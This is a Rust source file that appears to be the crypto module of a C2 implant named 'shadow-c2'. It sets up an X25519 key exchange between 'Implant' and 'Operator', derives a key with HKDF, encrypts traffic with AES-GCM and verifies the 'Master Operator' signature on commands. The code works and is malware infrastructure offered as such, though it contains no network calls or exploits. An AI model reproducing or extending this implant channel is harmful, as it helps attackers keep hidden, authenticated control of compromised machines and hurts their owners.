use aes_gcm::aead::{Aead, AeadCore, KeyInit, OsRng};
use aes_gcm::{Aes256Gcm, Nonce};
use anyhow::{anyhow, Result};
use ed25519_dalek::{Signature, Verifier, VerifyingKey};
use hkdf::Hkdf;
use rand::rngs::OsRng as RandOsRng;
use sha2::Sha256;
use x25519_dalek::{EphemeralSecret, PublicKey};
use zeroize::Zeroize;

pub struct CryptoSession {
    shared_key: [u8; 32],
}

impl CryptoSession {
    /// Step 1: Implant generates an ephemeral X25519 keypair
    pub fn generate_ephemeral() -> (EphemeralSecret, PublicKey) {
        let secret = EphemeralSecret::random_from_rng(RandOsRng);
        let public = PublicKey::from(&secret);
        (secret, public)
    }

    /// Step 2: Implant receives Operator's ephemeral pubkey, derives shared secret
    pub fn derive(implant_secret: EphemeralSecret, operator_pub_bytes: [u8; 32]) -> Result<Self> {
        let operator_pub = PublicKey::from(operator_pub_bytes);
        let shared_secret = implant_secret.diffie_hellman(&operator_pub);

        // Expand using HKDF
        let hkdf = Hkdf::<Sha256>::new(None, shared_secret.as_bytes());
        let mut key = [0u8; 32];
        hkdf.expand(b"shadow-c2-v1", &mut key)
            .map_err(|_| anyhow!("HKDF expansion failed"))?;

        Ok(Self { shared_key: key })
    }

    pub fn encrypt(&self, plaintext: &[u8]) -> Result<Vec<u8>> {
        let cipher = Aes256Gcm::new(&self.shared_key.into());
        let nonce = Aes256Gcm::generate_nonce(&mut OsRng); // 96-bits
        
        let mut ciphertext = cipher.encrypt(&nonce, plaintext)
            .map_err(|e| anyhow!("Encryption failed: {:?}", e))?;
            
        // Prepend nonce to ciphertext
        let mut payload = nonce.to_vec();
        payload.append(&mut ciphertext);
        Ok(payload)
    }

    pub fn decrypt(&self, payload: &[u8]) -> Result<Vec<u8>> {
        if payload.len() < 12 {
            return Err(anyhow!("Payload too short"));
        }
        let (nonce_bytes, ciphertext) = payload.split_at(12);
        let nonce = Nonce::from_slice(nonce_bytes);
        let cipher = Aes256Gcm::new(&self.shared_key.into());
        
        cipher.decrypt(nonce, ciphertext)
            .map_err(|e| anyhow!("Decryption failed: {:?}", e))
    }
}

impl Drop for CryptoSession {
    fn drop(&mut self) {
        self.shared_key.zeroize();
    }
}

/// Verify that a command was signed by the Master Operator
pub fn verify_operator_sig(operator_pub_bytes: &[u8], payload: &[u8], sig_bytes: &[u8]) -> Result<()> {
    if operator_pub_bytes.len() != 32 || sig_bytes.len() != 64 {
        return Err(anyhow!("Invalid key/sig length"));
    }
    
    let verifying_key = VerifyingKey::from_bytes(operator_pub_bytes.try_into()?)?;
    let signature = Signature::from_bytes(sig_bytes.try_into()?);
    
    verifying_key.verify(payload, &signature).map_err(|e| anyhow!("Invalid Signature: {}", e))
}
